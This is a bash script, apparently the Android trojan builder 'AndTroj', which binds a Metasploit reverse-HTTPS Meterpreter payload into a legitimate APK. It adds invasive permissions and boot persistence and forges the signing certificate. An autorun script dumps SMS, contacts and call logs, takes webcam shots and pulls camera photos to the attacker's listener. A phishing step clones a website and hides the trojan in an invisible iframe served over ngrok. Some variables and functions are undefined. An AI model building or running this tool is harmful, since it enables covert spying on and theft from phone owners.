#!/bin/bash
ver='2.0'


RED='\e[1;31m'
GREEN='\e[1;32m'
YELLOW='\e[1;33m'
BLUE='\e[1;34m'
CYAN='\e[1;36m'
WHITE='\e[1;37m'
NC='\e[0m'


# Check if running as root
if [[ "$(id -u)" -ne 0 ]]; then
    echo -e "${RED}[X] Please run as ROOT...${NC}"
    echo -e "${GREEN}[*] Usage: sudo $0 APK URL${NC}"
    exit 1
fi

# Check if two arguments are provided
if [[ $# -ne 2 ]]; then
    echo -e "${RED}[X] Please provide both APK and URL arguments!${NC}"
    echo -e "${GREEN}[*] Usage: sudo $0 APK URL${NC}"
    exit 1
fi

APK="$1"
URL="$2"

# Update system and install required packages
echo -e "${GREEN}[*] Updating system and installing required packages...${NC}"
apt update;apt upgrade -qy;apt dist-upgrade -qy;apt autoremove -qy;apt autoclean -qy
apt install -qy wget curl git net-tools gnupg apt-transport-https locate apktool metasploit-framework

# Kill any running ngrok or ruby processes (ignore errors if not found)
pkill -f 'ngrok\|ruby' || true

# Initial variables
USERS=$(ls /home)
LAN=$(hostname -I | awk '{print $1}')
OUTPUT=$(basename "$APK" .apk)
ORGAPK="/tmp/original"
PAYLOAD="/tmp/payload"


logo()
{
    reset;clear
    printf "$GREEN"   "                            --/osssssssssssso/--                    "
    printf "$GREEN"   "                        -+sss+-+--os.yo:++/.o-/sss+-                "
    printf "$GREEN"   "                     /sy+++-.h.-dd++m+om/s.h.hy/:+oys/              "
    printf "$GREEN"   "                  .sy/// h/h-:d-y:/+-/+-+/-s/sodooh:///ys.          "
    printf "$GREEN"   "                -ys-ss/:y:so-/osssso++++osssso+.oo+/s-:o.sy-        "
    printf "$GREEN"   "              -ys:oossyo/+oyo/:-:.-:.:/.:/-.-:/syo/+/s+:oo:sy-      "
    printf "$GREEN"   "             /d/:-soh/-+ho-.:::--:- .os: -:-.:-/::sy+:+ysso+:d/     "
    printf "$GREEN"   "            sy-..+oo-+h:--:..hy+y/  :s+.  /y/sh..:/-:h+-oyss:.ys    "
    printf "$WHITE"   "           ys :+oo/:d/   .m-yyyo/- - -:   .+oyhy-N.   /d::yosd.sy   "
    printf "$WHITE"   "          oy.++++//d.  ::oNdyo:     .--.     :oyhN+-:  .d//s//y.ys  "
    printf "$WHITE"   "         :m-y+++//d-   dyyy++::-. -.o.-+.- .-::/+hsyd   -d/so+++.m: "
    printf "$WHITE"   "        -d/-/+++.m-  /.ohso- ://:///++++///://:  :odo.+  -m.syoo:/d-"
    printf "$WHITE"   "        :m-+++y:y+   smyms-   -//+/-ohho-/+//-    omsmo   +y s+oy-m:"
    printf "$WHITE"   "        sy:+++y-N-  -.dy+:...-- :: ./hh/. :: --...//hh.:  -N-o+/:-so"
    printf "$WHITE"   "        yo-///s-m   odohd.-.--:/o.-+/::/+-.o/:--.--hd:ho   m-s+++-+y"
    printf "$WHITE"   "        yo::/+o-m   -yNy/:  ...:+s.//:://.s+:...  :/yNs    m-h++++oy"
    printf "$WHITE"   "        oy/hsss-N-  oo:oN-   .-o.:ss:--:ss:.o-.   -My-oo  -N-o+++.so"
    printf "$WHITE"   "        :m :++y:y+   sNMy+: -+/:.--:////:--.:/+- -+hNNs   +y-o++o-m:"
    printf "$WHITE"   "        -d/::+o+.m-  -:/+ho:.       -//-       ./sdo::-  -m-o++++/d-"
    printf "$WHITE"   "         :m-yo++//d- -ommMo//        -:        +oyNhmo- -d//s+++-m: "
    printf "$WHITE"   "          oy /o++//d.  -::/oMss-   -+++s     :yNy+/:   .d//y+---ys  "
    printf "$WHITE"   "           ys--+o++:d/ -/sdmNysNs+/./-//-//hNyyNmmy+- /d-+y--::sy   "
    printf "$RED"     "            sy:..ooo-+h/--.-//odm/hNh--yNh+Ndo//-./:/h+-so+:+/ys    "
    printf "$RED"     "             /d-o.ssy+-+yo:/:/:-:+sho..ohs/-:://::oh+.h//syo-d/     "
    printf "$RED"     "              -ys-oosyss:/oyy//::..-.--.--:/.//syo+-ys//o/.sy-      "
    printf "$RED"     "                -ys.sooh+d-s:+osssysssosssssso:/+/h:/yy/.sy-        "
    printf "$RED"     "                  .sy/:os.h--d/o+-/+:o:/+.+o:d-y+h-o+-+ys.          "
    printf "$RED"     "                     :sy+:+ s//sy-y.-h-m/om:s-y.++/+ys/             "
    printf "$RED"     "                        -+sss+/o/ s--y.s+/:++-+sss+-                "
    printf "$RED"     "                            --/osssssssssssso/--                    "
    printf "$BLUE"    "                                  Unk9vvN                           "
    printf "$YELLOW"  "                            https://unk9vvn.com                     "
    printf "$CYAN"    "                               AndTroj "$ver"                       "
    printf "\n\n"
}


join_by()
{
    local delimiter="$1"
    shift
    printf %s "$1" "${@/#/$delimiter}"
}


binder()
{	
	for i in $(seq 1 7); do
		a[$i]=`cat /proc/sys/kernel/random/uuid | sed 's/[-]//g' | head -c 20; echo;`
	done

	RAND=(${a[@]})
	RAND_DIR=${RAND[1]}
	RAND_MAINBRAD=${RAND[2]}
	RAND_PAYLOAD=${RAND[3]}
	RAND_MainService=${RAND[4]}

    # Generate payload APK using msfvenom
    msfvenom --platform android -a dalvik -p android/meterpreter/reverse_https LHOST="$NoIP" LPORT=443 -o /tmp/payload.apk
    apktool d -f /tmp/payload.apk -o "$PAYLOAD"
    rm -f /tmp/payload.apk

    # Decode the original APK
    apktool d -f "$APK" -o "$ORGAPK"
    mkdir -p "$ORGAPK/smali/com"

	# Change Android API Version
	printf "${GREEN}[*] sChange Android API Version\n"
	PACKAGE=`head -n 1 ${ORGAPK}/AndroidManifest.xml | sed -r 's/.*package="([^"]*)".*/\1/'`
	sed -i "1s#.*#<?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"no\"?><manifest xmlns:android=\"http://schemas.android.com/apk/res/android\" package=\"$PACKAGE\" platformBuildVersionCode=\"31\" platformBuildVersionName=\"12\">#" "${ORGAPK}/AndroidManifest.xml"

	# Set Permissions
	printf "${GREEN}[*] Set Permissions\n"
	permissions=(INTERNET ACCESS_WIFI_STATE CHANGE_WIFI_STATE ACCESS_NETWORK_STATE ACCESS_COARSE_LOCATION ACCESS_FINE_LOCATION READ_PHONE_STATE SEND_SMS RECEIVE_SMS RECORD_AUDIO CALL_PHONE READ_CONTACTS WRITE_CONTACTS RECORD_AUDIO WRITE_SETTINGS CAMERA READ_SMS WRITE_EXTERNAL_STORAGE RECEIVE_BOOT_COMPLETED SET_WALLPAPER READ_CALL_LOG WRITE_CALL_LOG WAKE_LOCK)

	for permission in "${permissions[@]}"; do 
		if ! grep -q "<uses-permission android:name=\"android.permission.$permission\"/>" "${ORGAPK}/AndroidManifest.xml"; then
			sed -i "/^<?xml.*/a \    <uses-permission android:name=\"android.permission.$permission\"/>" "${ORGAPK}/AndroidManifest.xml"
		fi
	done


	# Hooking Launchers
	echo -e "$GREEN [*]$YELLOW Hooking Launchers$WHITE"
	for line in $(seq 3 5);do
		line_num=`echo $(awk "/category.LAUNCHER/{ print NR - $line }" ${ORGAPK}/AndroidManifest.xml)`
		TAG=`sed -n "$line_num"p "${ORGAPK}/AndroidManifest.xml"`
		if [[ $TAG == *"android:name="* ]];then
			break
		fi
	done

	# Get Launcher PATH
	LAUNCHER=`echo $TAG | sed -r 's/.*android:name="([^"]*)".*/\1/'`
	LAUNCHER_PATH=`echo ${LAUNCHER%.*}`
	LAUNCHER_PATH=`echo ${LAUNCHER_PATH//.//}`
	LAUNCHER_FOLDERS=(${(@s:/:)LAUNCHER_PATH})
	
	# Get SMALI path
	SMALI_FOLDERS=(`ls $ORGAPK | grep smali`)
	for LAUNCHER_SMALI in $SMALI_FOLDERS;do
		if [ -f "$ORGAPK/$LAUNCHER_SMALI/${LAUNCHER//.//}.smali" ];then
			break
		fi
	done

	CUSTOM_FOLDER=""
	COUNTER=0
	for FOLDER in $LAUNCHER_FOLDERS;do
		if [ $COUNTER -eq 1 ];then
			CUSTOM_FOLDER="$FOLDER/"
		else
			CUSTOM_FOLDER="${CUSTOM_FOLDER}$FOLDER/"
		fi
		if [ ! -d "$ORGAPK/$LAUNCHER_SMALI/$CUSTOM_FOLDER" ];then
			mkdir "$ORGAPK/$LAUNCHER_SMALI/$CUSTOM_FOLDER"
		fi
		COUNTER=$[COUNTER + 1]
	done

	mkdir "$ORGAPK/$LAUNCHER_SMALI/$CUSTOM_FOLDER$RAND_DIR"
	sed -i "s#</application>#    <receiver android:label=\"$RAND_MAINBRAD\" android:name=\"${LAUNCHER%.*}.$RAND_MAINBRAD\">\\n            <intent-filter>\\n                <action android:name=\"android.intent.action.BOOT_COMPLETED\"/>\\n            </intent-filter>\\n        </receiver>\\n        <service android:exported=\"true\" android:name=\"${LAUNCHER%.*}.$RAND_MAINBRAD\"/>\\n    </application>#g" "${ORGAPK}/AndroidManifest.xml"


	# Clone Payload smali
	cd "$PAYLOAD/smali/com/metasploit/stage/"
	cp MainActivity.smali a.smali b.smali c.smali e.smali f.smali "$ORGAPK/$LAUNCHER_SMALI/$CUSTOM_FOLDER$RAND_DIR"
	cp -r "$PAYLOAD/smali/com/metasploit/stage/Payload.smali" "$ORGAPK/$LAUNCHER_SMALI/$CUSTOM_FOLDER$RAND_DIR/$RAND_PAYLOAD.smali"
	cp -r "$PAYLOAD/smali/com/metasploit/stage/MainService.smali" "$ORGAPK/$LAUNCHER_SMALI/$CUSTOM_FOLDER$RAND_DIR/$RAND_MainService.smali"
	cp -r "$PAYLOAD/smali/com/metasploit/stage/MainBroadcastReceiver.smali" "$ORGAPK/$LAUNCHER_SMALI/$CUSTOM_FOLDER$RAND_DIR/$RAND_MAINBRAD.smali"
	sed -i "s#metasploit/stage#$CUSTOM_FOLDER$RAND_DIR#g" "$ORGAPK/$LAUNCHER_SMALI/$CUSTOM_FOLDER$RAND_DIR/"*
	sed -i "s#payload#$RAND_PAYLOAD#g" "$ORGAPK/$LAUNCHER_SMALI/$CUSTOM_FOLDER$RAND_DIR/"*
	sed -i "s#MainService#$RAND_MainService#g" "$ORGAPK/$LAUNCHER_SMALI/$CUSTOM_FOLDER$RAND_DIR/"*
	sed -i "s#MainBroadcastReceiver#$RAND_MAINBRAD#g" "$ORGAPK/$LAUNCHER_SMALI/$CUSTOM_FOLDER$RAND_DIR/"*
	cd $SCRIPT_DIR


	# Second way to inject Launcher
	BACKUP=`cat $ORGAPK/AndroidManifest.xml | grep android:allowBackup | sed -r 's/.*android:name="([^"]*)".*/\1/'`
	BACKUP_PATH=`echo ${BACKUP%.*}`
	BACKUP_PATH=`echo ${BACKUP_PATH//.//}`


	# Get SMALI path
	SMALI_FOLDERS=(`ls $ORGAPK | grep smali`)
	for BACKUP_SMALI in $SMALI_FOLDERS;do
		if [ -f "$ORGAPK/$BACKUP_SMALI/${BACKUP//.//}.smali" ];then
			break
		fi
	done

	if [ ! -d "$ORGAPK/$BACKUP_SMALI/$BACKUP_PATH" ];then
		echo "in if: $ORGAPK/$BACKUP_SMALI/$BACKUP_PATH"
		sed -i "/invoke.*;->onCreate.*(Landroid\/os\/Bundle;)V/a \n\ \ \ \ invoke-static \{p\}, Lcom/$RAND_PAYLOAD/$RAND_PAYLOAD/$RAND_MainService\;->start(Landroid\/content\/Context;)V" "$ORGAPK/$LAUNCHER_SMALI/${LAUNCHER%.*}.smali"
	else
		echo "in else"
		LAUNCHER_STARTER_NUM=`awk '/put-object/{ print NR }'  "$ORGAPK/$BACKUP_SMALI/${BACKUP//.//}.smali" | head -1`
		sed -i "$LAUNCHER_STARTER_NUM a \ \ \ \ invoke-static\ {v0},\ Lcom/$CUSTOM_FOLDER$RAND_DIR/$RAND_MainService;->start()V" "$ORGAPK/$BACKUP_SMALI/${BACKUP//.//}.smali"
	fi
	cat > /tmp/persis.sh << EOF
#!/bin/bash
while true
do am start --user 0 -a android.intent.action.MAIN -n ${LAUNCHER%.*}/.MainActivity
sleep 600
done
EOF
	echo -e "$GREEN [*]$YELLOW Generate Persistent$WHITE"
	cat > /tmp/autoand.rc << EOF
upload /tmp/persis.sh
execute -f \"sh persis.sh\"
sysinfo
check_root
getwd
route
geolocate
screenshot
dump_calllog
dump_sms
dump_contacts
webcam_snap
cd ../../../../../
cd /sdcard/DCIM/Camera
download -r *
EOF
	echo -e "$GREEN [*]$YELLOW Rebinding $OUTPUT $WHITE"
	apktool b $ORGAPK > /dev/null

	echo -e "$GREEN [*]$YELLOW Forged Signatures$WHITE"
	CERT=`keytool -J-Duser.language=en -printcert -jarfile $APK`
	CERT_OWNER=`echo $CERT | grep -o 'Owner: [^"]*'`
	CERT_COUNTRY=`echo $CERT | grep -o 'C=[^\"]*' | head -1`
	CERT_LOCALITY=`echo $CERT | grep -o 'L=[^\,]*' | head -1`
	CERT_ORGAN=`echo $CERT | grep -o 'O=[^\,]*' | head -1`
	CERT_ORGAN_UNIT=`echo $CERT | grep -o 'OU=[^\,]*' | head -1`
	CERT_COMMON_NAME=`echo $CERT | grep -o 'CN=[^\,]*' | head -1`
	CERT_EMAIL=`echo $CERT | grep -o 'EMAILADDRESS=[^\,]*' | head -1`
	CERT_STATE=`echo $CERT | grep -o 'ST=[^\,]*' | head -1`
	CERT_EST=`echo $CERT | grep -o 'EST [^\"]* u' | head -1 | cut -d " " -f 2`
	CERT_EDT=`echo $CERT | grep -o 'EDT [^\"]*' | head -1 | cut -d " " -f 2`
	CERT_VALID=`echo $CERT | grep -o 'Valid from: [^"]*'`
	CERT_LENGTH=`echo $CERT | grep -oh 'Subject Public Key Algorithm: [^"]*' |  sed -r 's/.*Algorithm: ([^ ]*)-.*/\1/'`	
	CERT_TYPE=`echo $CERT | grep -oh 'Subject Public Key Algorithm: [^"]*' |  sed -r 's/.*bit ([^ ]*) key.*/\1/'`
	CERT_SIG=`echo $CERT | grep -oh 'Signature algorithm name: [^"]*' |  sed -r 's/.*: ([^ ]*) .*/\1/'`
	CERT_DIGEST=`echo $CERT_SIG | sed -r 's/.*^([^w]*)with.*/\1/'`

	if [ -f "/tmp/unk9vvn.keystore" ];then
    	rm /tmp/unk9vvn.keystore
	fi

	DNAME_DATA=($CERT_COMMON_NAME $CERT_ORGAN_UNIT $CERT_ORGAN $CERT_LOCALITY $CERT_STATE $CERT_COUNTRY)
	DNAME=`join_by "," $DNAME_DATA`
	
	if [[ -z ${CERT_EST+z} ]];then
		keytool -genkey -alias signing.key -keystore /tmp/unk9vvn.keystore -storepass 12341234 -keypass 12341234 -keyalg $CERT_TYPE -keysize $CERT_LENGTH -startdate $CERT_EST/01/01 -validity $CERT_EDT -dname "$DNAME" > /dev/null
	else
		keytool -genkey -alias signing.key -keystore /tmp/unk9vvn.keystore -storepass 12341234 -keypass 12341234 -keyalg $CERT_TYPE -keysize $CERT_LENGTH -validity $CERT_EDT -dname "$DNAME" > /dev/null
	fi

	mv $ORGAPK/dist/$OUTPUT.apk "$SCRIPT_DIR/$OUTPUT-b.apk"
	jarsigner -verbose -sigalg $CERT_SIG -digestalg $CERT_DIGEST -keystore /tmp/unk9vvn.keystore "$OUTPUT-b.apk" signing.key -storepass 12341234 > /dev/null
	BANNER


	msfconsole -qx "use multi/handler;set PAYLOAD android/meterpreter/reverse_https; \
	set LHOST $NoIP;set LPORT 443;set ReverseListenerBindAddress $LAN; \
	set AutoRunScript /tmp/autoand.rc;set AndroidWakelock true;exploit -j"
}


phishing()
{
	# start webserver
	service apache2 start

	# start ngrok
	sleep 2
	ngrok http 80 >/dev/null 2>&1 &
	sleep 5
	NGHOST=$(curl -s http://127.0.0.1:4040/api/tunnels | jq -r .tunnels[0].public_url | sed 's|https://||')
	mv $OUTPUT-b.apk /var/www/html/
	wget -O /var/www/html/index.html -c -k -q -U \
	"Mozilla/5.0 (Macintosh; Intel MacOS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36" $URL

	# inject iframe apk
	sed -i "s|</body>|<iframe id='frame' src='$OUTPUT-b.apk' application='yes' width=0 height=0 style='display:none;' frameborder=0 marginheight=0 marginwidth=0 scrolling=no></iframe>\n<script type='text/javascript'>setTimeout(function(){window.location.href='$URL';}, 15000);</script>\n</body>|g" /var/www/html/index.html
	printf "$GREEN"  "[*] Send Phishing Link to TARGET: $NGHOST"
}


main()
{
	# install ngrok
	if [ ! -f "/usr/local/bin/ngrok" ]; then
		name="ngrok"
		wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz -O /tmp/$name.tgz
		tar -xvzf /tmp/$name.tgz -C /usr/local/bin;rm -f /tmp/$name.tgz
		chmod +x /usr/local/bin/ngrok
		printf "$GREEN"  "[*] Successfully Installed $name"
	fi

	# install noip2
	if [ ! -f "/usr/local/bin/noip2" ]; then
		name="noip"
		mkdir -p /usr/share/$name
		wget https://www.noip.com/client/linux/noip-duc-linux.tar.gz -O /tmp/$name.tar.gz
		tar --strip-components=1 -xzf /tmp/$name.tar.gz -C /usr/share/$name;rm -f /tmp/$name.tar.gz
		chmod 755 /usr/share/$name/*
		cd /usr/share/$name;make;make install
		printf "$GREEN"  "[*] Successfully Installed $name"
	fi

	# install atj
	if [ ! -d "/usr/share/andtroj" ]; then
		name="andtroj"
		git clone https://github.com/a9v8i/AndTroj /usr/share/$name
		chmod 755 /usr/share/$name/*
		cat > /usr/bin/$name << EOF
#!/bin/bash
cd /usr/share/$name;bash atj.sh "\$@"
EOF
		chmod +x /usr/bin/$name
		printf "$GREEN"  "[*] Successfully Installed $name"
	elif [ "$(curl -s https://raw.githubusercontent.com/a9v8i/AndTroj/main/version)" != $ver ]; then
		name="andtroj"
		git clone https://github.com/a9v8i/AndTroj /usr/share/$name
		chmod 755 /usr/share/$name/*
		cat > /usr/bin/$name << EOF
#!/bin/bash
cd /usr/share/$name;bash atj.sh "\$@"
EOF
		chmod +x /usr/bin/$name
		printf "$GREEN"  "[*] Successfully Updating $name"
		bash /usr/share/$name/$name.sh
	fi

	binder
	phishing
}


main
